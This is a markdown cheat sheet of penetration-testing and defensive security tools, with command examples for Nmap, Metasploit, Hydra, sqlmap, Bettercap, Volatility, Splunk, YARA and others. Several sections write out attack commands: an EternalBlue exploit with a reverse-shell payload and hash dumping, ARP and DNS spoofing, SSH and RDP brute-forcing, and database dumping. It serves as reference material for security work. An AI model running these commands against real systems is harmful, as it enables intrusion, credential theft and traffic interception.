# Cybersecurity Tools

## Table of Contents

1. [Reconnaissance Tools](#reconnaissance-tools)
2. [Scanning Tools](#scanning-tools)
3. [Network Analysis](#network-analysis)
4. [Exploitation Frameworks](#exploitation-frameworks)
5. [Password Cracking](#password-cracking)
6. [Web Application Security](#web-application-security)
7. [Forensics Tools](#forensics-tools)
8. [Monitoring & SIEM](#monitoring--siem)
9. [Endpoint Security](#endpoint-security)

---

## Reconnaissance Tools

### 1. Nmap (Network Mapper)

```bash
# Basic scan
nmap 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Full port scan
nmap -p- 192.168.1.1

# Aggressive scan
nmap -A 192.168.1.1

# Stealth scan
nmap -sS 192.168.1.1

# Scan specific ports
nmap -p 22,80,443 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Script scanning
nmap --script vuln 192.168.1.1

# Output to file
nmap -oA output 192.168.1.1

# Network discovery
nmap -sn 192.168.1.0/24
```

**Nmap Scripts:**

```bash
# HTTP enumeration
nmap --script http-enum -p 80 target

# SMB enumeration
nmap --script smb-enum-shares -p 445 target

# SSL vulnerabilities
nmap --script ssl-heartbleed -p 443 target

# DNS enumeration
nmap --script dns-brute target
```

### 2. Recon-ng

```bash
# Start Recon-ng
recon-ng

# Create workspace
workspaces create project_name

# Install modules
marketplace install all

# Use modules
modules load recon/domains-hosts/bing_domain_web

# Set options
options set SOURCE example.com

# Run module
run
```

### 3. theHarvester

```bash
# Email and subdomain enumeration
theHarvester -d example.com -b google

# Using multiple sources
theHarvester -d example.com -b google,bing,linkedin

# Output to file
theHarvester -d example.com -b all -f results.html
```

### 4. Maltego

```
Maltego Features:
├── Visual link analysis
├── OSINT gathering
├── Data mining
├── Relationship mapping
└── Transform hub (plugins)

Common Transforms:
├── Domain to IP
├── Email to Person
├── Company to Employees
├── Domain to DNS
└── Social media enumeration
```

---

## Scanning Tools

### 1. Nessus

```bash
# Nessus commands
# Start service
systemctl start nessusd

# Access web interface
# https://localhost:8834

# Nessus policies
# - Host Discovery
# - Basic Network Scan
# - Advanced Scan
# - Web Application Tests
# - Compliance checks
```

### 2. OpenVAS

```bash
# Install OpenVAS
apt install openvas

# Setup
openvas-setup

# Start services
systemctl start greenbone-security-assistant
systemctl start openvas-scanner
systemctl start openvas-manager

# Access web interface
# https://localhost:9392
```

### 3. Nikto

```bash
# Basic scan
nikto -h http://target

# Scan with authentication
nikto -h target -id user:pass

# Scan specific ports
nikto -h target -p 80,443,8080

# Evasion techniques
nikto -h target -evasion 1

# Output to file
nikto -h target -o results.html -Format htm
```

### 4. Unicornscan

```bash
# TCP scan
unicornscan -mT target

# UDP scan
unicornscan -mU target

# SYN scan with rate
unicornscan -mS target -r 300

# Scan port range
unicornscan -mT target:1-1000
```

---

## Network Analysis

### 1. Wireshark

```
Wireshark Filters:

# By IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 10.0.0.1

# By Protocol
http
tcp
dns
tls

# By Port
tcp.port == 80
tcp.dstport == 443

# By Content
http contains "login"
tcp contains "password"

# Complex filters
http && ip.src == 192.168.1.100
tcp.port == 80 && http.request.method == "POST"

# Follow streams
tcp.stream eq 5
```

**Wireshark Analysis Tips:**

```bash
# Capture files
# PCAP, PCAPNG formats

# Key statistics
Statistics → Conversations    # View connections
Statistics → Protocol Hierarchy  # Protocol breakdown
Statistics → Endpoints        # Host communication

# IO Graphs
Statistics → I/O Graphs       # Traffic visualization
```

### 2. tcpdump

```bash
# Basic capture
tcpdump -i eth0

# Capture to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Filter by host
tcpdump host 192.168.1.100

# Filter by port
tcpdump port 80

# Capture HTTP traffic
tcpdump -A 'tcp port 80'

# Capture DNS
tcpdump -i eth0 port 53

# Capture packets with payload
tcpdump -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
```

### 3. Ettercap

```bash
# Start Ettercap
ettercap -G

# ARP poisoning
ettercap -T -i eth0 -M arp /192.168.1.1/ /192.168.1.100/

# With DNS spoofing
ettercap -T -i eth0 -M arp -P dns_spoof /192.168.1.0/24/
```

### 4. Bettercap

```bash
# Start bettercap
bettercap

# ARP spoofing
set arp.spoof.targets 192.168.1.100
arp.spoof on

# DNS spoofing
set dns.spoof.domains target.com
set dns.spoof.address 192.168.1.100
dns.spoof on

# SSL stripping
sslstrip on

# Packet capture
net.sniff on
```

---

## Exploitation Frameworks

### 1. Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit

# Meterpreter commands
sysinfo                    # System information
getuid                     # Current user
hashdump                   # Dump password hashes
download file.txt          # Download file
upload shell.exe           # Upload file
shell                      # System shell
screenshot                 # Capture screenshot
keyscan_start              # Start keylogger
```

**Metasploit Payloads:**

```bash
# List payloads
show payloads

# Common payloads
# Windows
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_http

# Linux
linux/x64/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Listeners
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```

### 2. Cobalt Strike

```
Cobalt Strike Features:
├── Beacon payloads
├── Covert C2 channels
├── Malleable C2 profiles
├── Process injection
├── Privilege escalation
├── Lateral movement
└── Reporting

Beacon Types:
├── DNS Beacon
├── HTTP Beacon
├── HTTPS Beacon
├── SMB Beacon
└── TCP Beacon
```

### 3. Empire

```bash
# Start Empire
python empire

# List listeners
listeners

# Use HTTP listener
usertype http

# Set options
set Host http://192.168.1.50:80

# Generate launcher
launcher powershell

# Interact with agents
interact agent_id

# Modules
usemodule privesc/msherpy
```

---

## Password Cracking

### 1. John the Ripper

```bash
# Basic usage
john hash.txt

# Specify format
john --format=raw-md5 hash.txt

# Wordlist attack
john --wordlist=passwords.txt hash.txt

# Rules-based
john --rules --wordlist=passwords.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Incremental mode
john --incremental hash.txt
```

### 2. Hashcat

```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA-256
hashcat -m 1400 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# With rules
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule

# Brute force
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a

# GPU acceleration
hashcat -m 0 hash.txt wordlist.txt -d 1

# Show results
hashcat -m 0 hash.txt --show
```

**Hashcat Attack Modes:**

| Mode | Name | Description |
|------|------|-------------|
| 0 | Straight | Wordlist attack |
| 1 | Combination | Combine words |
| 3 | Brute-force | Try all combinations |
| 6 | Hybrid Wordlist+Mask | Wordlist + pattern |
| 7 | Hybrid Mask+Wordlist | Pattern + wordlist |

### 3. Hydra

```bash
# SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# HTTP form
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.100

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# With threads
hydra -l admin -P passwords.txt -t 4 ssh://target
```

---

## Web Application Security

### 1. Burp Suite

```
Burp Suite Components:

Proxy ──────────── Intercept/modify traffic
├── HTTP history
├── WebSockets history
└── Options

Spider ─────────── Crawl web applications
├── Status
└── Options

Scanner ────────── Vulnerability scanning
├── Scan queue
└── Results

Intruder ───────── Automated attacks
├── Attack types: Sniper, Battering ram, Pitchfork, Cluster bomb
└── Payload sets

Repeater ───────── Manual request testing
└── Request/Response panels

Decoder ────────── Encode/decode data
├── URL
├── HTML
├── Base64
├── Hex
└── Gzip

Comparer ──────── Diff responses
└── Hex/Text view
```

**Burp Suite Tips:**

```bash
# Configure browser proxy
# HTTP Proxy: 127.0.0.1:8080

# Install CA certificate
# Visit http://burp
# Download certificate

# Intercept requests
Proxy → Intercept → Intercept is on

# Repeat requests
Right-click → Send to Repeater

# Automated scanning
Right-click → Do active scan
```

### 2. OWASP ZAP

```bash
# Quick scan
zap-cli quick-scan http://target

# Full scan
zap-full-scan.py -t http://target

# API scan
zap-api-scan.py -t http://target/swagger.json -f openapi

# Spider
zap-cli spider http://target

# Active scan
zap-cli active-scan http://target

# Report
zap-cli report -o report.html -f html
```

### 3. SQLMap

```bash
# Basic SQL injection test
sqlmap -u "http://target/page?id=1"

# With POST data
sqlmap -u "http://target/login" --data="user=admin&pass=*"

# Databases
sqlmap -u "http://target/page?id=1" --dbs

# Tables
sqlmap -u "http://target/page?id=1" -D database --tables

# Dump table
sqlmap -u "http://target/page?id=1" -D database -T users --dump

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"
```

### 4. Wfuzz

```bash
# Directory fuzzing
wfuzz -c -z file,wordlist.txt http://target/FUZZ

# Parameter fuzzing
wfuzz -c -z file,wordlist.txt -d "param=FUZZ" http://target

# Username enumeration
wfuzz -c -z file,users.txt -d "user=FUZZ&pass=pass" http://target

# Bypass WAF
wfuzz -c -z file,wordlist.txt -H "X-Forwarded-For: FUZZ" http://target
```

---

## Forensics Tools

### 1. Autopsy

```
Autopsy Features:
├── Disk image analysis
├── File system analysis
├── Timeline analysis
├── Keyword search
├── Registry analysis
├── Web artifacts
├── Email analysis
└── Deleted file recovery

Supported Formats:
├── E01 (EnCase)
├── RAW (dd)
├── AFF
└── VMDK
```

### 2. Volatility

```bash
# Image info
volatility -f memory.dmp imageinfo

# Process list
volatility -f memory.dmp --profile=Win7SP1x64 pslist

# Network connections
volatility -f memory.dmp --profile=Win7SP1x64 netscan

# Command history
volatility -f memory.dmp --profile=Win7SP1x64 cmdline

# DLL list
volatility -f memory.dmp --profile=Win7SP1x64 dlllist

# Handle dump
volatility -f memory.dmp --profile=Win7SP1x64 filescan

# Extract files
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -D output/
```

### 3. Sleuth Kit

```bash
# File system analysis
fls image.E01           # List files
tsk_recover image.E01   # Recover deleted
tsk_loaddb -i db image.E01  # Load to database

# File analysis
icat image.E01 inode    # Extract file
fstat image.E01 inode   # File metadata

# Volume system
mmls image.E01          # List partitions
```

### 4. Autopsy (CLI)

```bash
# Create case
autopsy create case ProjectName

# Add data source
autopsy add datasource case_id /path/to/evidence

# Run ingest modules
autopsy run ingest case_id data_source_id

# Generate report
autopsy generate report case_id html
```

---

## Monitoring & SIEM

### 1. Splunk

```spl
# Search queries
index=security sourcetype=firewall action=blocked

# Failed logins
index=security sourcetype=auth "failed login" | stats count by src_ip

# Top attackers
index=security sourcetype=ids | top src_ip | head 10

# Timechart
index=security | timechart count by sourcetype

# Alert
index=security sourcetype=auth "failed login" | stats count by src_ip | where count > 10
```

### 2. ELK Stack

```json
// Elasticsearch query
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event_type": "authentication"}},
        {"match": {"status": "failed"}}
      ],
      "filter": [
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}
```

**Kibana Visualizations:**

```
Dashboard Types:
├── Security Overview
├── Network Traffic
├── Authentication Events
├── Vulnerability Management
└── Incident Response
```

### 3. OSSEC

```xml
<!-- OSSEC rule example -->
<rule id="100001" level="10">
  <if_sid>18101</if_sid>
  <match>Failed password for root</match>
  <description>Root login attempt failed</description>
  <group>authentication_failures</group>
</rule>
```

### 4. Suricata

```bash
# Run Suricata
suricata -c /etc/suricata/suricata.yaml -i eth0

# Update rules
suricata-update

# Test config
suricata -T -c /etc/suricata/suricata.yaml

# PCAP analysis
suricata -c config.yaml -r capture.pcap
```

---

## Endpoint Security

### 1. YARA

```yara
rule malware_detection {
    meta:
        description = "Detects potential malware"
        author = "Security Analyst"
        date = "2024-01-01"
    
    strings:
        $s1 = "malicious_string"
        $hex1 = {4D 5A 90 00}
        $regex1 = /http:\/\/.*\.exe/
    
    condition:
        $hex1 at 0 and ($s1 or $regex1)
}
```

### 2. ClamAV

```bash
# Scan file
clamscan file.exe

# Scan directory
clamscan -r /home/

# Update definitions
freshclam

# Daemon mode
clamdscan --fdpass file
```

### 3. OpenEDR

```bash
# Monitor processes
ps aux | grep -i suspicious

# Check connections
netstat -tuln | grep ESTABLISHED

# Review logs
tail -f /var/log/syslog | grep -i "blocked"
```

---

## Tool Comparison Charts

### Scanning Tools Comparison

| Tool | Type | Cost | Best For |
|------|------|------|----------|
| Nessus | Vulnerability | Commercial | Enterprise scanning |
| OpenVAS | Vulnerability | Free | Small business |
| Nikto | Web | Free | Quick web assessment |
| Qualys | Cloud | SaaS | Large organizations |

### Exploitation Frameworks

| Framework | Learning Curve | Features | Cost |
|-----------|---------------|----------|------|
| Metasploit | Medium | Extensive | Free/Pro |
| Cobalt Strike | High | Advanced C2 | Commercial |
| Empire | Medium | PowerShell | Free |
| Core Impact | High | Enterprise | Commercial |

### Password Crackers

| Tool | Speed | GPU Support | Ease of Use |
|------|-------|-------------|-------------|
| John the Ripper | Medium | Limited | Easy |
| Hashcat | Fast | Excellent | Medium |
| Hydra | N/A | No | Easy |
| Aircrack-ng | Medium | Yes | Easy |

---

## Installation Scripts

### Kali Linux Tools

```bash
# Install Kali tools on Ubuntu
echo "deb http://http.kali.org/kali kali-rolling main" | sudo tee /etc/apt/sources.list.d/kali.list
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
sudo apt update
sudo apt install -y kali-linux-small
```

### Docker Setup

```bash
# Burp Suite
docker run -p 8080:8080 portswigger/burp-suite

# OWASP ZAP
docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

# Metasploit
docker run -it --rm metasploitframework/metasploit-framework
```

---

## Tool Selection Guide

```
Which Tool Should I Use?

Need to scan network? ──────► Nmap
Need vulnerability scan? ───► Nessus/OpenVAS
Need web app testing? ──────► Burp Suite
Need exploit testing? ──────► Metasploit
Need password cracking? ────► Hashcat/John
Need forensics? ───────────► Autopsy/Volatility
Need network monitoring? ───► Wireshark/tcpdump
Need SIEM? ────────────────► Splunk/ELK
```

---

*Last Updated: 2024*
